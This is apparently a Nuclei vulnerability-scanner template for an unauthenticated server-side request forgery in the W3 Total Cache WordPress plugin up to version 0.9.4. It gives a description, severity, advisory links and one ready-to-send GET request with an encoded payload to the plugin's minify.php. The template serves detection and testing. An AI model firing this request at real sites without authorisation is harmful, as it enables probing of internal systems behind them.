# Nuclei Template: Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF)
**Template ID:** w3c-total-cache-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Medium
**Source:** Nuclei Template (`w3c-total-cache-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css
```

## References
- https://wpvulndb.com/vulnerabilities/8644
- https://klikki.fi/adv/w3_total_cache.html
